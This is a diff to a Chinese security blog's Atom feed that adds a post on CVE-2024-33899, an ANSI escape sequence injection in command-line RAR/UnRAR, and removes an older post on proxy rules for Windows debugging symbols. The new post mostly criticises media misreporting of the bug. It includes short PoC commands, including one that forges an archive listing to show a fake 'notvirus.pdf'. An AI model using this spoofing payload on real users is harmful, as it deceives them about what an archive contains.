@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://programlife.net/"/>
-  <updated>2024-04-20T16:30:19.000Z</updated>
+  <updated>2024-05-26T13:11:05.000Z</updated>
   <id>https://programlife.net/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞</title>
+    <link href="https://programlife.net/2024/05/26/cve-2024%E2%80%9333899-winrar-escape-sequence-injection-vulnerability/"/>
+    <id>https://programlife.net/2024/05/26/cve-2024–33899-winrar-escape-sequence-injection-vulnerability/</id>
+    <published>2024-05-26T13:33:37.000Z</published>
+    <updated>2024-05-26T13:11:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>从 CVE-2024-33899 看<strong>洋垃圾小编</strong>污染简体中文互联网🤡</p><a id="more"></a><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>WinRAR 里面存在的 <a href="https://programlife.net/tags/Escape-Sequence/">Escape Sequence</a> 注入漏洞，影响命令行版本的 RAR 和 UnRAR：</p><ul><li>Windows CVE-2024–36052</li><li>Linux/Unix CVE-2024–33899</li></ul><p>PoC 测试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-624.tar.gz</span><br><span class="line">tar -xzf rarlinux-x64-624.tar.gz</span><br><span class="line">cd rar</span><br><span class="line">./rar a demo.rar readme.txt</span><br><span class="line">printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | ./rar c demo.rar</span><br><span class="line">./rar l demo.rar</span><br></pre></td></tr></table></figure><p><img src="/uploads/202405/winrar-escape-sequence-injection.webp" alt="CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞"></p><p>漏洞比较鸡肋，就是玩玩 Escape Sequence Injection，比如伪造压缩文件列表（关键 Payload 为 <code>\e[8m</code>）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar</span><br></pre></td></tr></table></figure><p>对于某些环境可以 DoS，参考 <a href="https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757" target="_blank" rel="noopener">Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare</a>。</p><h2 id="0x02-故事起源"><a href="#0x02-故事起源" class="headerlink" title="0x02. 故事起源"></a>0x02. 故事起源</h2><p>在微信公众号看到某条推送：</p><blockquote><h2 id="WinRAR-漏洞让攻击者利用-ANSI-转义序列欺骗用户"><a href="#WinRAR-漏洞让攻击者利用-ANSI-转义序列欺骗用户" class="headerlink" title="WinRAR 漏洞让攻击者利用 ANSI 转义序列欺骗用户"></a>WinRAR 漏洞让攻击者利用 ANSI 转义序列欺骗用户</h2><p>通过制作包含这些序列的恶意档案，攻击者可以操纵显示的输出并欺骗用户相信他们正在打开无害的文件，例如 PDF 或图像。</p><p>当用户尝试在WinRAR中打开看似无害的文件时，由于对文件扩展名处理不当，漏洞就会被触发。</p><p>Dushantha 表示，WinRAR 的 ShellExecute 函数没有启动预期的文件，而是收到了错误的参数并执行了隐藏的恶意脚本，例如批处理文件 (.bat) 或命令脚本 (.cmd) 。</p></blockquote><p>看起来把 WinRAR 漏洞 CVE-2023-38831 的影响移植过来了，而且说是漏洞作者 Dushantha 说的🤡，这里是直接翻译了英文内容：</p><blockquote><p>By crafting malicious archives containing these sequences, attackers can manipulate the displayed output and deceive users into believing they are opening a harmless file, such as a PDF or image.</p><p>When a user attempts to open the seemingly benign file from within WinRAR, the vulnerability is triggered due to improper handling of file extensions.</p><p>Instead of launching the expected file, WinRAR’s ShellExecute function receives an incorrect parameter and executes a hidden malicious script, such as a batch file (.bat) or command script (.cmd), Dushantha <a href="https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983" target="_blank" rel="noopener">said</a>.</p></blockquote><p>还给出了作者的原始 Blog，简直一本正经胡说八道，<strong>真●洋垃圾小编污染简体中文互联网</strong>。</p><h2 id="0x03-References"><a href="#0x03-References" class="headerlink" title="0x03. References"></a>0x03. References</h2><ol><li><a href="https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983" target="_blank" rel="noopener">ANSI Escape Injection Vulnerability in WinRAR | by Siddharth Dushantha | May, 2024 | Medium</a></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;从 CVE-2024-33899 看&lt;strong&gt;洋垃圾小编&lt;/strong&gt;污染简体中文互联网🤡&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
+    
+      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
+    
+    
+      <category term="Escape Sequence" scheme="https://programlife.net/tags/Escape-Sequence/"/>
+    
+      <category term="WinRAR" scheme="https://programlife.net/tags/WinRAR/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2024-3400 PAN-OS 路径穿越&amp;命令注入漏洞利用</title>
@@ -564,29 +590,6 @@
       <category term="CVE-2020-3805" scheme="https://programlife.net/tags/CVE-2020-3805/"/>
     
       <category term="PDF" scheme="https://programlife.net/tags/PDF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows 调试符号下载代理配置</title>
-    <link href="https://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/"/>
-    <id>https://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/</id>
-    <published>2020-02-23T00:13:37.000Z</published>
-    <updated>2024-03-17T02:37:05.616Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 <code>E_PDB_NOT_FOUND</code>），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。</p><p><img src="/uploads/202002/ida-pro-pdb-not-found.png" alt="IDA Pro 无法下载 Notepad 的调试符号"></p><a id="more"></a><p>后来发现，这次是无法从微软的服务器下载任何调试符号，比如使用 WinDbg 自带的 <code>symchk.exe</code> 无法给 System32 目录下的任一文件下载调试符号，而且在不同的机器上（拥有不同的代理上网环境）均不能下载调试符号，这就非常奇怪了。</p><p>笔者在某不存在的社交网站上反应了这个问题，有网友表示需要使用 VPN，也有网友表示需要绕过长城，还有网友表示 VPN 也不解决问题，而国外友人则表示完全不存在这个问题！很显然，这跟国内复杂的网络环境不无关系！</p><p>笔者打开了 Wireshark，想看看从微软的服务器下载调试符号时到底发生了什么。比如，在给 Notepad 下载调试符号时，后台访问的 URL 如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://msdl.microsoft.com/download/symbols/notepad.pdb/BC0D363AF49A0E2C05B06DA4535DA0C71/notepad.pdb</span><br></pre></td></tr></table></figure><p>接着会重定向到以下地址：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://vsblobprodscussu5shard60.blob.core.windows.net/b-4712e0edc5a240eabf23330d7df68e77/F6311B221044787072987B74992D6DE770FCBBFED09C2853B4F10350CB964FF900.blob?sv=2017-04-17&amp;sr=b&amp;si=1&amp;sig=ulHtMVJpGWuEvNczzOR6J3g2rXS1s9qwwmEqJ1x63wg%3D&amp;spr=https&amp;se=2020-02-24T01%3A57%3A40Z&amp;rscl=x-e2eid-66439cf8-65874550-b9c5b293-e8bf7391-session-627c05ca-398743d1-b7a6ab61-b0fbc28f</span><br></pre></td></tr></table></figure><p>Chrome 提示 <code>ERR_CONNECTION_RESET</code> ，显然 <code>vsblobprodscussu5shard60.blob.core.windows.net</code> 被 Block 了。那为什么此时代理不管用了呢？而代理服务器本身是可以正常访问这个地址的，或者说，基于代理服务器上的 VPN 也可以正常访问这个地址。</p><p>后来发现，笔者使用的是 PAC 代理上网模式（<strong>Proxy Auto-Config</strong>，<a href="https://zh.wikipedia.org/zh-hans/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">代理自动配置</a>），上网流量要不要经过代理服务器是根据 PAC 规则文件来定的（相对全局代理模式更加智能），而 <code>windows.net</code> 并没有出现在一些流行的 PAC 规则文件中，因此这里无法正常下载调试符号文件。</p><p>解决方案非常简单，给 PAC 规则文件增加一条记录 <code>.windows.net</code> ，表示支持 <code>windows.net</code> 下所有地址的访问。</p><p><img src="/uploads/202002/across-the-great-wall.png" alt="越过长城，走向世界"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 &lt;code&gt;E_PDB_NOT_FOUND&lt;/code&gt;），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/uploads/202002/ida-pro-pdb-not-found.png&quot; alt=&quot;IDA Pro 无法下载 Notepad 的调试符号&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
-    
-    
-      <category term="WinDbg" scheme="https://programlife.net/tags/WinDbg/"/>
     
   </entry>
   
